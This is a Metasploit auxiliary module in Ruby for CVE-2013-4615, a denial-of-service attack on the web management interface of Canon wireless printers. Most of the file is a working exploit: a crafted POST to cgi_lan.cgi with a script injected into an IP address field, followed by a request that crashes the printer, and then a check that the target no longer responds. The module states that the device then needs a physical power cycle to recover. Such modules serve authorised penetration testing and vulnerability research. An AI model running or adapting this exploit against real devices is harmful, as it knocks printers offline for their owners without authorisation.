##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require 'msf/core'

class Metasploit3 < Msf::Auxiliary

  include Msf::Exploit::Remote::HttpClient
  include Msf::Auxiliary::Dos

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Canon Wireless Printer Denial Of Service',
      'Description'    => %q{
        The HTTP management interface on several models of Canon Wireless printers
        allows for a Denial of Service (DoS) condition via a crafted HTTP request. Note:
        if this module is successful, the device can only be recovered with a physical
        power cycle.
      },
      'License'        => MSF_LICENSE,
      'Author'         =>
      [
        'Matt "hostess" Andreko <mandreko[at]accuvant.com>'
      ],
      'References'     => [
        [ 'CVE', '2013-4615' ],
        [ 'URL', 'http://www.mattandreko.com/2013/06/canon-y-u-no-security.html']
      ],
      'DisclosureDate' => 'Jun 18 2013'))
  end

  def is_alive?
    res = send_request_raw({
      'method'	=>	'GET',
      'uri'		=>	'/',
    },10)

    return !res.nil?
  end

  def run

    begin

      # The first request will set the new IP
      res = send_request_cgi({
        'method'	=>	'POST',
        'uri'		=>	'/English/pages_MacUS/cgi_lan.cgi',
        'data'		=>	'OK.x=61' +
          '&OK.y=12' +
          '&LAN_OPT1=2' +
          '&LAN_TXT1=Wireless' +
          '&LAN_OPT3=1' +
          '&LAN_TXT21=192' +
          '&LAN_TXT22=168' +
          '&LAN_TXT23=1' +
          '&LAN_TXT24=114"><script>alert(\'xss\');</script>' +
          '&LAN_TXT31=255' +
          '&LAN_TXT32=255' +
          '&LAN_TXT33=255' +
          '&LAN_TXT34=0' +
          '&LAN_TXT41=192' +
          '&LAN_TXT42=168' +
          '&LAN_TXT43=1' +
          '&LAN_TXT44=1' +
          '&LAN_OPT2=4' +
          '&LAN_OPT4=1' +
          '&LAN_HID1=1'
      })

      rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout, ::Timeout::Error, ::Errno::EPIPE
        print_error("Couldn't connect to #{rhost}:#{rport}")
      return
    end

    # The second request will load the network options page, which seems to trigger the DoS
    send_request_cgi({
      'method'	=>	'GET',
      'uri'		=>	'/English/pages_MacUS/lan_set_content.html'
    },5) #default timeout, we don't care about the response

    # Check to see if it worked or not
    if is_alive?
      print_error("#{rhost}:#{rport} - Server is still alive")
    else
      print_good("#{rhost}:#{rport} - Connection Refused: Success!")
    end

  end
end
